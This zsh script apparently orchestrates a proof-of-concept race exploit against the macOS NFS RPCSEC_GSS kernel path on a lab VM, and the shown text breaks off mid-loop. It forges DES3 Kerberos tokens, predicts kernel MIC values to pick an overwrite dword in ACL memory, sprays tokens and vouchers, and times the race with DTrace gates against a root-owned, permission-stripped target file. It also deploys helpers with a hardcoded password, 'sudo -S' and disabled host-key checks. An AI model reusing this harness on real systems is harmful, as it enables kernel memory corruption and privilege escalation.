#!/bin/zsh

set -u

run_id=${1:-cross_digest_acl_prestaged_nonmutual_beta4}
release_port=${2:-19130}
continue_delay_us=${3:-0}
acl_workers=${4:-8}
acl_calls=${5:-64}
acl_release_mode=${6:-neighbor}
continue_release_mode=${7:-ordered}
plaintext_length=${8:-32768}
acl_mode=${9:-access}
target_location=${10:-host}
voucher_count=${11:-256}
fixed_sequence=${12:-}
data_delay_us=${13:-0}
selective_pid_file=${14:-}
acl_baseline_right=${15:-write}
des3_wave_count=${16:-0}
continue_zero_token=${17:-0}
selective_release_mode=${18:-pre}
selective_release_delay=${19:-0.005}
repair_continue_count=${20:-0}
repair_continue_delay_us=${21:-0}
repair_continue_stagger_us=${22:-0}
race_data_count=${23:-1}
data_stagger_us=${24:-0}
selective_stage2_mode=${25:-dtrace}
selective_stage2_delay_us=${26:-0}
candidate_min_aes_mic=${27:-1}
mic_hold_ns=${28:-50000000}
external_groom_ready_file=${RPC_GSS_EXTERNAL_GROOM_READY_FILE:-}
external_groom_release_file=${RPC_GSS_EXTERNAL_GROOM_RELEASE_FILE:-}
external_groom_timeout_ms=${RPC_GSS_EXTERNAL_GROOM_TIMEOUT_MS:-120000}
predictor_min_dword=${RPC_GSS_PREDICTOR_MIN_DWORD:-1}
predictor_max_dword=${RPC_GSS_PREDICTOR_MAX_DWORD:-112}
continue_zero_assignment=
if [[ "${continue_zero_token}" == 1 ]]; then
	continue_zero_assignment=RPC_GSS_CONTINUE_ZERO_TOKEN=1
fi
repair_wait_file=
if (( repair_continue_count > 0 )); then
	repair_wait_file=dtrace_signal2
fi
host=192.168.64.84
user=${RPC_GSS_VM_USER:-testtest}
password=test
root=/Users/dawgyg/codex_scratch/nfs_beta4_static_20260727
lane=/Users/dawgyg/codex_lanes/nfs_rpcsecgss_poc
dtrace_source=${RPC_GSS_DTRACE_SCRIPT:-${root}/trace_cross_digest_fixedspray_acl_beta4.d}
dtrace_remote_name=${dtrace_source:t}
base="${root}/${run_id}"
target_stage_gate="${base}.target.stage.go"
target_prearm_gate="${base}.target.prearm.go"
target_data_gate="${base}.target.data.go"
target_continue_gate="${base}.target.continue.go"
target_sequence_file="${base}.target.sequence.txt"
des3_token="${base}.des3.client.bin"
des3_lucid="${base}.des3.lucid.txt"
aes_lucid="${base}.aes.lucid.txt"
des3_generate_log="${base}.des3.generate.log"
target_log="${base}.target.log"
scan_log="${base}.scan.log"
wave_log="${base}.wave.log"
remote_wave_gate="/Users/testtest/${run_id}.des3.go"
remote_wave_ready="/Users/testtest/${run_id}.des3.ready"
remote_wave_prefix="/Users/testtest/${run_id}.wave"
remote_trace="/Users/testtest/${run_id}.dtrace.out"
remote_acl_target=/Users/testtest/acl_oracle/target
remote_acl_gate="/Users/testtest/${run_id}.acl.go"
remote_acl_log="/Users/testtest/${run_id}.acl.log"
remote_acl_result="/Users/testtest/${run_id}.acl.result.bin"
remote_mic_event_gate="/Users/testtest/${run_id}.mic_alloc"
remote_voucher_log="/Users/testtest/${run_id}.voucher.log"
remote_target_base="/Users/testtest/${run_id}.target"
remote_target_stage_gate="${remote_target_base}.stage.go"
remote_target_prearm_gate="${remote_target_base}.prearm.go"
remote_target_data_gate="${remote_target_base}.data.go"
remote_target_sequence_file="${remote_target_base}.sequence.txt"
remote_target_des3_token="${remote_target_base}.des3.client.bin"
remote_target_aes_lucid="${remote_target_base}.aes.lucid.txt"
local_trace="${base}.dtrace.out"
target_continue_wait_file=
target_data_wait_file=
remote_target_data_wait_file=
continue_event_port=0
disable_mic_event_poll=0
if [[ "${continue_release_mode}" == event ]]; then
	target_continue_wait_file="${target_continue_gate}"
elif [[ "${continue_release_mode}" == netevent ]]; then
	target_continue_wait_file="${target_continue_gate}"
	continue_event_port=$((release_port + 1000))
elif [[ "${continue_release_mode}" == ordered ]]; then
	target_continue_wait_file=data_sent
elif [[ "${continue_release_mode}" == dtrace ]]; then
	target_continue_wait_file=dtrace_signal
elif [[ "${continue_release_mode}" == staged ]]; then
	target_data_wait_file="${target_data_gate}"
	remote_target_data_wait_file="${remote_target_data_gate}"
	if [[ "${target_location}" == host ]]; then
		continue_event_port=$((release_port + 1000))
	fi
elif [[ "${continue_release_mode}" == staged_direct ]]; then
	target_data_wait_file=dtrace_data_signal
	remote_target_data_wait_file=dtrace_data_signal
	disable_mic_event_poll=1
elif [[ "${continue_release_mode}" == delay ]]; then
	disable_mic_event_poll=1
else
	print -u2 "invalid continue release mode: ${continue_release_mode}"
	exit 1
fi
if [[ "${target_location}" != host && "${target_location}" != remote ]]; then
	print -u2 "invalid target location: ${target_location}"
	exit 1
fi
if [[ ! -f "${dtrace_source}" || "${dtrace_remote_name}" != *.d ]]; then
	print -u2 "invalid DTrace source: ${dtrace_source}"
	exit 1
fi
if [[ "${target_location}" == remote &&
    "${continue_release_mode}" != dtrace &&
    "${continue_release_mode}" != staged &&
    "${continue_release_mode}" != staged_direct &&
    "${continue_release_mode}" != ordered &&
    "${continue_release_mode}" != delay ]]; then
	print -u2 "remote target requires dtrace, staged, staged_direct, ordered, or delay release mode"
	exit 1
fi
if [[ "${acl_baseline_right}" != read &&
    "${acl_baseline_right}" != write ]]; then
	print -u2 "invalid ACL baseline right: ${acl_baseline_right}"
	exit 1
fi
if (( acl_workers < 0 || acl_workers > 256 )); then
	print -u2 "invalid ACL worker count: ${acl_workers}"
	exit 1
fi
if (( acl_calls < 1 || acl_calls > 65536 )); then
	print -u2 "invalid ACL call count: ${acl_calls}"
	exit 1
fi
if (( candidate_min_aes_mic < 1 || candidate_min_aes_mic > 16 )); then
	print -u2 "invalid candidate AES MIC ordinal: ${candidate_min_aes_mic}"
	exit 1
fi
if (( predictor_min_dword < 1 || predictor_max_dword > 128 ||
    predictor_min_dword > predictor_max_dword )); then
	print -u2 "invalid predictor dword range: ${predictor_min_dword}-${predictor_max_dword}"
	exit 1
fi
if (( mic_hold_ns < 1000000 || mic_hold_ns > 500000000 )); then
	print -u2 "invalid MIC hold duration: ${mic_hold_ns}"
	exit 1
fi
if [[ -n "${external_groom_ready_file}" ||
    -n "${external_groom_release_file}" ]]; then
	if [[ -z "${external_groom_ready_file}" ||
	    -z "${external_groom_release_file}" ||
	    "${external_groom_timeout_ms}" != <-> ||
	    "${external_groom_timeout_ms}" -lt 10 ||
	    "${external_groom_timeout_ms}" -gt 3600000 ]]; then
		print -u2 "invalid external groom gate configuration"
		exit 1
	fi
	rm -f "${external_groom_ready_file}" "${external_groom_release_file}"
fi
if (( des3_wave_count < 0 || des3_wave_count > 64 )); then
	print -u2 "invalid DES3 wave count: ${des3_wave_count}"
	exit 1
fi
if (( repair_continue_count < 0 || repair_continue_count > 8 )); then
	print -u2 "invalid same-handle repair count: ${repair_continue_count}"
	exit 1
fi
if (( repair_continue_delay_us < 0 ||
    repair_continue_delay_us > 1000000 )); then
	print -u2 "invalid same-handle repair delay: ${repair_continue_delay_us}"
	exit 1
fi
if (( repair_continue_stagger_us < 0 ||
    repair_continue_stagger_us > 1000000 ||
    (repair_continue_count > 0 &&
    repair_continue_stagger_us * repair_continue_count > 5000000) )); then
	print -u2 "invalid same-handle repair stagger: ${repair_continue_stagger_us}"
	exit 1
fi
if (( race_data_count < 1 || race_data_count > 64 )); then
	print -u2 "invalid race DATA count: ${race_data_count}"
	exit 1
fi
if (( data_stagger_us < 0 || data_stagger_us > 1000000 ||
    data_delay_us + (race_data_count - 1) * data_stagger_us > 1000000 )); then
	print -u2 "invalid race DATA stagger: ${data_stagger_us}"
	exit 1
fi
if [[ "${selective_stage2_mode}" != dtrace &&
    "${selective_stage2_mode}" != all_delay &&
    "${selective_stage2_mode}" != helper_delay ]]; then
	print -u2 "invalid selective stage-2 mode: ${selective_stage2_mode}"
	exit 1
fi
if [[ ("${selective_stage2_mode}" == all_delay ||
    "${selective_stage2_mode}" == helper_delay) &&
    -z "${selective_pid_file}" ]]; then
	print -u2 "${selective_stage2_mode} stage-2 requires a selective PID file"
	exit 1
fi
if (( selective_stage2_delay_us < 0 ||
    selective_stage2_delay_us > 1000000 )); then
	print -u2 "invalid selective stage-2 delay: ${selective_stage2_delay_us}"
	exit 1
fi
selective_stage2_delay_seconds=$(printf '%d.%06d' \
    $((selective_stage2_delay_us / 1000000)) \
    $((selective_stage2_delay_us % 1000000)))
if [[ "${continue_zero_token}" != 0 &&
    "${continue_zero_token}" != 1 ]]; then
	print -u2 "invalid zero-token selector: ${continue_zero_token}"
	exit 1
fi
if [[ "${selective_release_mode}" != pre &&
    "${selective_release_mode}" != dtrace &&
    "${selective_release_mode}" != tight ]]; then
	print -u2 "invalid selective release mode: ${selective_release_mode}"
	exit 1
fi
ssh_opts=(
	-o ConnectionAttempts=3
	-o ConnectTimeout=5
	-o ControlMaster=auto
	-o ControlPath=/tmp/codex-vm84-%C
	-o ControlPersist=120
	-o IdentitiesOnly=yes
	-o KbdInteractiveAuthentication=yes
	-o NumberOfPasswordPrompts=1
	-o PasswordAuthentication=yes
	-o PubkeyAuthentication=no
	-o PreferredAuthentications=keyboard-interactive,password
	-o StrictHostKeyChecking=no
	-o UserKnownHostsFile=/dev/null
)
target_pid=0
wave_pid=0
release_pid=0
event_bridge_pid=0
stage2_release_pid=0
target_prearm_released=0

cleanup()
{
	trap - EXIT HUP INT TERM
	for pid in ${target_pid} ${wave_pid} ${release_pid} ${event_bridge_pid} \
	    ${stage2_release_pid}; do
		if (( pid > 0 )); then
			kill ${pid} 2>/dev/null || true
			wait ${pid} 2>/dev/null || true
		fi
	done
	sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" \
	    "pkill -TERM -f '^/bin/zsh /Users/testtest/run_des3_dtrace_supervisor_beta4.sh.*${run_id}' 2>/dev/null || true; \
	    pkill -TERM -x rgssig 2>/dev/null || true; \
	    pkill -TERM -x aclsig 2>/dev/null || true; \
	    pkill -TERM -x v32oracle 2>/dev/null || true; \
	    pgrep -f '^/Users/testtest/aclsig ' | xargs kill -TERM 2>/dev/null || true; \
	    pgrep -f '^/Users/testtest/rpc_gss_crypto_race_prearmed_gate_signal ' | xargs kill -TERM 2>/dev/null || true; \
	    pkill -TERM -f '^/Users/testtest/acl_access_oracle ' 2>/dev/null || true; \
	    pkill -TERM -f '^/Users/testtest/v32oracle ' 2>/dev/null || true; \
	    pkill -TERM -f '^tail -n +1 -f ${remote_trace}' 2>/dev/null || true; \
	    printf 'test\n' | sudo -S pkill -TERM -f '/usr/sbin/dtrace.*${run_id}.dtrace.out' \
	    2>/dev/null || true; \
	    sleep 0.2; \
	    pgrep -f '^/Users/testtest/aclsig ' | xargs kill -KILL 2>/dev/null || true; \
	    pgrep -f '^/Users/testtest/rpc_gss_crypto_race_prearmed_gate_signal ' | xargs kill -KILL 2>/dev/null || true" \
	    >/dev/null 2>&1 || true
}

fail()
{
	print -u2 "$*"
	cleanup
	exit 1
}

trap cleanup EXIT HUP INT TERM

rm -f "${target_stage_gate}" "${target_prearm_gate}" \
    "${target_data_gate}" "${target_continue_gate}" \
    "${target_sequence_file}" "${des3_token}" "${des3_lucid}" \
    "${aes_lucid}" \
    "${des3_generate_log}" "${target_log}" "${scan_log}" "${wave_log}" \
    "${local_trace}"

env \
    KRB5_CONFIG="${root}/krb5-mit-des3-beta4.conf" \
    KRB5CCNAME="FILE:${root}/mit_testtest_des3_beta4.ccache" \
    RPC_GSS_NO_MUTUAL=1 \
    RPC_GSS_EXPORT_LUCID_FILE="${des3_lucid}" \
    RPC_GSS_TOKEN_ONLY=1 \
    "${lane}/rpc_gss_crypto_race_prestaged_nonmutual" \
    "${host}" nfs@tests-virtual-machine.local \
    "${des3_token}" "${base}.des3.server.bin" \
    0 0 0 0 "${plaintext_length}" >"${des3_generate_log}" 2>&1 ||
    fail "pre-staged non-mutual DES3 token generation failed"

des3_key=$(awk -F= '$1 == "key_hex" { print $2 }' "${des3_lucid}" |
    tail -1)
if [[ ${#des3_key} -ne 48 || ! -s "${des3_token}" ]]; then
	fail "pre-staged DES3 token/key artifacts are incomplete"
fi

cleanup_ok=0
for attempt in $(seq 1 8); do
	if sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" \
	    "pgrep -f '^/bin/zsh /Users/testtest/run_des3_dtrace_supervisor_beta4.sh ' | xargs kill -TERM 2>/dev/null || true; \
	    pgrep -f '^/Users/testtest/aclsig ' | xargs kill -TERM 2>/dev/null || true; \
	    pgrep -f '^/Users/testtest/rpc_gss_crypto_race_prearmed_gate_signal ' | xargs kill -TERM 2>/dev/null || true; \
	    pgrep -f '^/Users/testtest/acl_access_oracle ' | xargs kill -TERM 2>/dev/null || true; \
	    pgrep -f '^/Users/testtest/v32oracle ' | xargs kill -TERM 2>/dev/null || true; \
	    pgrep -f '^/Users/testtest/rgssig ' | xargs kill -TERM 2>/dev/null || true; \
	    printf 'test\n' | sudo -S pkill -TERM -f '/usr/sbin/dtrace.*cross_digest_acl' 2>/dev/null || true; \
	    sleep 0.2; \
	    pgrep -f '^/bin/zsh /Users/testtest/run_des3_dtrace_supervisor_beta4.sh ' | xargs kill -KILL 2>/dev/null || true; \
	    pgrep -f '^/Users/testtest/aclsig ' | xargs kill -KILL 2>/dev/null || true; \
	    pgrep -f '^/Users/testtest/rpc_gss_crypto_race_prearmed_gate_signal ' | xargs kill -KILL 2>/dev/null || true; \
	    pgrep -f '^/Users/testtest/acl_access_oracle ' | xargs kill -KILL 2>/dev/null || true; \
	    pgrep -f '^/Users/testtest/v32oracle ' | xargs kill -KILL 2>/dev/null || true; \
	    pgrep -f '^/Users/testtest/rgssig ' | xargs kill -KILL 2>/dev/null || true" \
	    >/dev/null 2>&1; then
		cleanup_ok=1
		break
	fi
	sleep 1
done
if (( cleanup_ok == 0 )); then
	fail "could not clean stale VM race helpers"
fi
sleep 0.2

sshpass -p "${password}" scp "${ssh_opts[@]}" \
    "${dtrace_source}" \
	    "${root}/run_des3_dtrace_supervisor_beta4.sh" \
	    "${lane}/acl_access_oracle" \
	    "${lane}/dtrace_signal_fanout" \
	    "${lane}/dtrace_tcp_notifier" \
	    "${lane}/voucher32_prearmed_oracle" \
    "${lane}/rpc_gss_crypto_race_prearmed_gate_signal" \
    "${root}/krb5-mit-des3-beta4.conf" \
    "${root}/mit_testtest_des3_beta4.ccache" \
    "${user}@${host}:/Users/testtest/" >/dev/null 2>&1 ||
    fail "common race artifact deployment failed"
sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" \
		    "cp /Users/testtest/acl_access_oracle /Users/testtest/aclsig; \
		    cp /Users/testtest/dtrace_signal_fanout /Users/testtest/aclbridge; \
		    cp /Users/testtest/dtrace_tcp_notifier /Users/testtest/ctxnotify; \
		    cp /Users/testtest/voucher32_prearmed_oracle /Users/testtest/v32oracle; \
		    chmod +x /Users/testtest/aclsig /Users/testtest/aclbridge \
		    /Users/testtest/ctxnotify \
		    /Users/testtest/v32oracle \
    /Users/testtest/rpc_gss_crypto_race_prearmed_gate_signal \
    /Users/testtest/run_des3_dtrace_supervisor_beta4.sh" \
    >/dev/null 2>&1 || fail "common race artifact activation failed"

if [[ "${target_location}" == remote ]]; then
	sshpass -p "${password}" scp "${ssh_opts[@]}" \
	    "${root}/krb5-mit-beta4.conf" \
	    "${root}/krb5-mit-des3-beta4.conf" \
	    "${root}/mit_testtest_beta4.ccache" \
	    "${root}/mit_testtest_des3_beta4.ccache" \
	    "${lane}/rpc_gss_crypto_race_double_gate" \
	    "${des3_token}" \
	    "${user}@${host}:/Users/testtest/" >/dev/null 2>&1 ||
	    fail "remote race artifact deployment failed"
	sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" \
	    "cp /Users/testtest/rpc_gss_crypto_race_double_gate \
	    /Users/testtest/rgssig; \
	    mv /Users/testtest/${des3_token:t} ${remote_target_des3_token}; \
	    chmod +x /Users/testtest/rgssig; \
	    rm -f ${remote_target_stage_gate} ${remote_target_prearm_gate} \
	    ${remote_target_data_gate} ${remote_target_sequence_file} \
	    ${remote_target_aes_lucid}" \
	    >/dev/null 2>&1 ||
	    fail "remote race artifact activation failed"
	sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" \
	    "env KRB5_CONFIG=/Users/testtest/krb5-mit-beta4.conf \
	    KRB5CCNAME=FILE:/Users/testtest/mit_testtest_beta4.ccache \
	    RPC_GSS_RACE_WAIT_FILE=${remote_target_stage_gate} \
	    RPC_GSS_PREARM_WAIT_FILE=${remote_target_prearm_gate} \
	    RPC_GSS_DATA_WAIT_FILE=${remote_target_data_wait_file} \
	    RPC_GSS_CONTINUE_WAIT_FILE=${target_continue_wait_file} \
	    RPC_GSS_DATA_SEQUENCE_FILE=${remote_target_sequence_file} \
	    RPC_GSS_EXPORT_LUCID_FILE=${remote_target_aes_lucid} \
	    RPC_GSS_CONTINUE_TOKEN_FILE=${remote_target_des3_token} \
	    RPC_GSS_SPRAY_TOKEN_FILE=${remote_target_des3_token} \
		    RPC_GSS_SPRAY_COUNT=${repair_continue_count} \
		    RPC_GSS_SPRAY_DELAY_US=${repair_continue_delay_us} \
		    RPC_GSS_SPRAY_STAGGER_US=${repair_continue_stagger_us} \
		    RPC_GSS_SPRAY_WAIT_FILE=${repair_wait_file} \
		    ${continue_zero_assignment} \
		    RPC_GSS_CAPTURE_CONTINUE_REPLY_FILE=${remote_target_base}.continue.reply.bin \
		    RPC_GSS_CAPTURE_DATA_REPLY_FILE=${remote_target_base}.data.reply.bin \
		    RPC_GSS_DATA_DELAY_US=${data_delay_us} \
		    RPC_GSS_DATA_STAGGER_US=${data_stagger_us} \
	    /Users/testtest/rgssig ${host} nfs@tests-virtual-machine.local \
	    ${remote_target_base}.client.bin ${remote_target_base}.server.bin \
	    0 ${race_data_count} 1 ${continue_delay_us} ${plaintext_length}" \
	    >"${target_log}" 2>&1 &
else
	env \
	    KRB5_CONFIG="${root}/krb5-mit-beta4.conf" \
	    KRB5CCNAME="FILE:${root}/mit_testtest_beta4.ccache" \
	    RPC_GSS_RACE_WAIT_FILE="${target_stage_gate}" \
	    RPC_GSS_PREARM_WAIT_FILE="${target_prearm_gate}" \
	    RPC_GSS_DATA_WAIT_FILE="${target_data_wait_file}" \
	    RPC_GSS_CONTINUE_WAIT_FILE="${target_continue_wait_file}" \
	    RPC_GSS_DATA_SEQUENCE_FILE="${target_sequence_file}" \
	    RPC_GSS_EXPORT_LUCID_FILE="${aes_lucid}" \
	    RPC_GSS_CONTINUE_TOKEN_FILE="${des3_token}" \
	    RPC_GSS_SPRAY_TOKEN_FILE="${des3_token}" \
	    RPC_GSS_SPRAY_COUNT="${repair_continue_count}" \
	    RPC_GSS_SPRAY_DELAY_US="${repair_continue_delay_us}" \
	    RPC_GSS_SPRAY_STAGGER_US="${repair_continue_stagger_us}" \
	    RPC_GSS_SPRAY_WAIT_FILE="${repair_wait_file}" \
		    ${continue_zero_assignment:+${continue_zero_assignment}} \
		    RPC_GSS_CAPTURE_CONTINUE_REPLY_FILE="${base}.continue.reply.bin" \
		    RPC_GSS_CAPTURE_DATA_REPLY_FILE="${base}.data.reply.bin" \
		    RPC_GSS_DATA_DELAY_US="${data_delay_us}" \
		    RPC_GSS_DATA_STAGGER_US="${data_stagger_us}" \
	    "${lane}/rpc_gss_crypto_race_double_gate" \
	    "${host}" nfs@tests-virtual-machine.local \
	    "${base}.target.client.bin" "${base}.target.server.bin" \
	    0 "${race_data_count}" 1 "${continue_delay_us}" "${plaintext_length}" \
	    >"${target_log}" 2>&1 &
fi
target_pid=$!

for attempt in $(seq 1 1200); do
	if grep -q '^race_waiting ' "${target_log}" 2>/dev/null; then
		break
	fi
	if ! kill -0 "${target_pid}" 2>/dev/null; then
		break
	fi
	sleep 0.025
done
if ! grep -q '^race_waiting ' "${target_log}" 2>/dev/null; then
	fail "AES target did not reach the sequence-selection gate"
fi
target_gss_handle=$(sed -n 's/^handle=\([0-9a-fA-F]*\) .*/\1/p' \
    "${target_log}" | head -1)
if [[ ${#target_gss_handle} != 8 ]]; then
	fail "could not recover the target GSS handle"
fi

if [[ "${target_location}" == remote ]]; then
	sshpass -p "${password}" scp "${ssh_opts[@]}" \
	    "${user}@${host}:${remote_target_aes_lucid}" \
	    "${aes_lucid}" >/dev/null 2>&1 ||
	    fail "could not retrieve the AES lucid context"
fi
aes_key=$(awk -F= '$1 == "key_hex" { print $2 }' "${aes_lucid}" |
    tail -1)
if [[ ${#aes_key} -ne 32 && ${#aes_key} -ne 64 ]]; then
	fail "AES lucid context has an invalid key length"
fi

next_header=$(sed -n 's/^next_server_mic_header=//p' "${target_log}" |
    tail -1)
if [[ ${#next_header} -ne 32 ]]; then
	fail "could not recover the next AES reply-MIC header"
fi

if [[ -n "${fixed_sequence}" ]]; then
	selected_sequence=${fixed_sequence}
	selected_overwrite=unselected
	printf 'rpc_sequence=%s\noverwrite_dword=%s\nmode=fixed_sequence_timing\n' \
	    "${selected_sequence}" "${selected_overwrite}" >"${scan_log}"
else
	predictor="${lane}/aes_kernel_mic_predict"
	prediction_key="${aes_key}"
		if [[ "${continue_release_mode}" == staged ||
		    "${continue_release_mode}" == staged_direct ||
		    "${continue_release_mode}" == delay ]]; then
		predictor="${lane}/des3_kernel_mic_predict"
		prediction_key="${des3_key}"
	fi
	"${predictor}" --scan-rpcseq \
	    "${prediction_key}" "${next_header}" \
	    "${predictor_min_dword}" "${predictor_max_dword}" >"${scan_log}" ||
	    fail "could not select an ACL-range overwrite dword"

	selected_sequence=$(awk -F= '$1 == "rpc_sequence" { print $2 }' \
	    "${scan_log}")
	selected_overwrite=$(awk -F= '$1 == "overwrite_dword" { print $2 }' \
	    "${scan_log}")
	if [[ -z "${selected_sequence}" || -z "${selected_overwrite}" ]]; then
		fail "predictor output was incomplete"
	fi
fi
printf '%s\n' "${selected_sequence}" >"${target_sequence_file}"

if [[ "${target_location}" == remote ]]; then
	sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" \
	    "printf 'test\n' | sudo -S launchctl kickstart -k system/com.apple.gssd; \
	    sleep 0.2; pgrep -x gssd" >/dev/null 2>&1 ||
	    fail "could not activate gssd immediately before the race"
	sshpass -p "${password}" scp "${ssh_opts[@]}" \
	    "${target_sequence_file}" \
	    "${user}@${host}:${remote_target_sequence_file}" >/dev/null 2>&1 ||
	    fail "remote selected sequence deployment failed"
	sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" \
	    "touch ${remote_target_stage_gate}" >/dev/null 2>&1 ||
	    fail "remote sequence-selection gate release failed"
else
	touch "${target_stage_gate}"
fi
for attempt in $(seq 1 1200); do
	if grep -q '^race_prearmed_waiting ' "${target_log}" 2>/dev/null; then
		break
	fi
	if ! kill -0 "${target_pid}" 2>/dev/null; then
		break
	fi
	sleep 0.025
done
if ! grep -q '^race_prearmed_waiting ' "${target_log}" 2>/dev/null; then
	fail "selected-sequence target did not prearm"
fi

sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" \
		    "printf 'test\n' | sudo -S chown testtest:staff ${remote_acl_target}; \
    printf 'test\n' | sudo -S chmod 644 ${remote_acl_target}; \
    chmod -N ${remote_acl_target} 2>/dev/null || true; \
	    chmod +a 'user:testtest allow ${acl_baseline_right}' ${remote_acl_target}; \
    printf 'test\n' | sudo -S chown root:wheel ${remote_acl_target}; \
    printf 'test\n' | sudo -S chmod 000 ${remote_acl_target}; \
			    exec env DISABLE_MIC_EVENT_POLL=${disable_mic_event_poll} \
			    CANDIDATE_MIN_AES_MIC=${candidate_min_aes_mic} \
			    MIC_HOLD_NS=${mic_hold_ns} \
			    TARGET_GSS_HANDLE=0x${target_gss_handle} \
			    /Users/testtest/run_des3_dtrace_supervisor_beta4.sh \
	    ${des3_wave_count} ${remote_wave_prefix} ${remote_wave_gate} \
    ${remote_wave_ready} ${release_port} \
    /Users/testtest/${dtrace_remote_name} \
	    ${remote_trace} ${remote_acl_target} ${remote_acl_gate} \
	    ${remote_acl_log} ${remote_acl_result} ${acl_calls} ${acl_workers} \
	    ${remote_mic_event_gate} ${acl_mode} ${acl_release_mode} \
	    192.168.64.1 ${continue_event_port} ${voucher_count} \
	    ${remote_voucher_log}" >"${wave_log}" 2>&1 &
wave_pid=$!

for attempt in $(seq 1 2400); do
	if grep -q '^supervisor_ready ' "${wave_log}" 2>/dev/null; then
		break
	fi
	if ! kill -0 "${wave_pid}" 2>/dev/null; then
		break
	fi
	sleep 0.025
done
if ! grep -q '^supervisor_ready ' "${wave_log}" 2>/dev/null; then
	fail "DTrace/ACL supervisor did not become ready"
fi

if [[ "${continue_release_mode}" == event ]]; then
	(
		if sshpass -p "${password}" ssh "${ssh_opts[@]}" \
		    "${user}@${host}" \
		    "for attempt in \$(seq 1 120000); do \
		    if test -e ${remote_mic_event_gate}; then exit 0; fi; \
		    sleep 0.001; done; exit 1"; then
			touch "${target_continue_gate}"
			print "continue_event_released gate=${target_continue_gate}"
		else
			print -u2 "continue_event_bridge_failed"
		fi
	) >"${base}.event.log" 2>&1 &
	event_bridge_pid=$!
elif [[ "${continue_release_mode}" == netevent ]]; then
	(
		if nc -l "${continue_event_port}" >/dev/null; then
			touch "${target_continue_gate}"
			print "continue_netevent_released gate=${target_continue_gate} port=${continue_event_port}"
		else
			print -u2 "continue_netevent_bridge_failed port=${continue_event_port}"
		fi
	) >"${base}.event.log" 2>&1 &
	event_bridge_pid=$!
elif [[ "${continue_release_mode}" == staged ]]; then
	(
		if [[ "${target_location}" == remote ]]; then
			sshpass -p "${password}" ssh "${ssh_opts[@]}" \
			    "${user}@${host}" \
			    "for attempt in \$(seq 1 120000); do
			        if grep -q ' REPLACEMENT_DESTROY_BARRIER ' \
			            ${remote_trace} 2>/dev/null; then
			            touch ${remote_target_data_gate}
			            printf 'staged_data_released gate=%s\\n' \
			                ${remote_target_data_gate}
			            exit 0
			        fi
			        sleep 0.001
			    done
			    exit 1"
		else
			if "${lane}/udp_one_shot_gate" \
			    "${continue_event_port}" "${target_data_gate}"; then
				print "staged_data_released phase=ctx_init_network gate=${target_data_gate}"
				exit 0
			fi
			exit 1
		fi
	) >"${base}.event.log" 2>&1 &
	event_bridge_pid=$!
fi

(
	printf x | nc -w 1 "${host}" "${release_port}"
) >"${base}.release.log" 2>&1 &
release_pid=$!
sleep 0.001
if [[ -n "${external_groom_ready_file}" ]]; then
	touch "${external_groom_ready_file}"
	external_groom_waits=$((external_groom_timeout_ms / 10))
	for attempt in $(seq 1 "${external_groom_waits}"); do
		if [[ -e "${external_groom_release_file}" ]]; then
			break
		fi
		if ! kill -0 "${target_pid}" 2>/dev/null ||
		    ! kill -0 "${wave_pid}" 2>/dev/null; then
			break
		fi
		sleep 0.01
	done
	if [[ ! -e "${external_groom_release_file}" ]]; then
		fail "external groom release gate timed out"
	fi
	print "external_groom_released ready=${external_groom_ready_file} release=${external_groom_release_file}"
fi
if [[ -n "${selective_pid_file}" &&
    "${selective_release_mode}" == pre ]]; then
	sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" \
	    "set -e
	    expected=\$(wc -l < '${selective_pid_file}' | tr -d ' ')
	    xargs kill -USR1 < '${selective_pid_file}'
	    for attempt in \$(seq 1 800); do
	        ready=\$(grep -l '^voucher_selective_stage1 ' \
	            /Users/testtest/v32_select_helper.*.log 2>/dev/null |
	            wc -l | tr -d ' ')
	        if [ \"\${ready}\" -eq \"\${expected}\" ]; then
	            exit 0
	        fi
	        sleep 0.025
	    done
	    printf 'selective stage-1 timeout: %s/%s\\n' \
	        \"\${ready:-0}\" \"\${expected}\" >&2
	    exit 1" >/dev/null 2>&1 ||
	    fail "selective voucher stage-1 release failed"
elif [[ -n "${selective_pid_file}" ]]; then
	if [[ "${selective_release_mode}" == tight ]]; then
		if [[ "${target_location}" == remote ]]; then
			sshpass -p "${password}" ssh "${ssh_opts[@]}" \
			    "${user}@${host}" \
			    "xargs kill -USR1 < '${selective_pid_file}'
			    sleep '${selective_release_delay}'
			    touch '${remote_target_prearm_gate}'" \
			    >/dev/null 2>&1 ||
			    fail "tight selective release failed"
		else
			sshpass -p "${password}" ssh "${ssh_opts[@]}" \
			    "${user}@${host}" \
			    "xargs kill -USR1 < '${selective_pid_file}'" \
			    >/dev/null 2>&1 ||
			    fail "tight selective stage-1 release failed"
			sleep "${selective_release_delay}"
			touch "${target_prearm_gate}"
		fi
		target_prearm_released=1
		print "selective_stage1_release=tight delay=${selective_release_delay}"
	else
		print "selective_stage1_release=dtrace_prealloc"
	fi
fi
if [[ "${target_location}" == remote &&
    "${target_prearm_released}" == 0 ]]; then
	sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" \
	    "touch ${remote_target_prearm_gate}" >/dev/null 2>&1 || true
elif [[ "${target_location}" != remote ]]; then
	touch "${target_prearm_gate}"
fi
if [[ "${selective_stage2_mode}" == all_delay ]]; then
	(
		sleep "${selective_stage2_delay_seconds}"
		sshpass -p "${password}" ssh "${ssh_opts[@]}" \
		    "${user}@${host}" \
		    "xargs kill -USR2 < '${selective_pid_file}'"
		print "selective_stage2_all_released delay_us=${selective_stage2_delay_us}"
	) >"${base}.stage2.log" 2>&1 &
	stage2_release_pid=$!
fi
wait "${release_pid}" 2>/dev/null || true
release_pid=0

if [[ "${continue_release_mode}" == event ]]; then
	wait "${event_bridge_pid}" 2>/dev/null || true
	event_bridge_pid=0
	if [[ ! -e "${target_continue_gate}" ]]; then
		fail "target MIC event bridge did not release CONTINUE"
	fi
elif [[ "${continue_release_mode}" == netevent ]]; then
	for attempt in $(seq 1 1200); do
		if [[ -e "${target_continue_gate}" ]]; then
			break
		fi
		if ! kill -0 "${target_pid}" 2>/dev/null ||
		    ! kill -0 "${wave_pid}" 2>/dev/null; then
			break
		fi
		sleep 0.01
	done
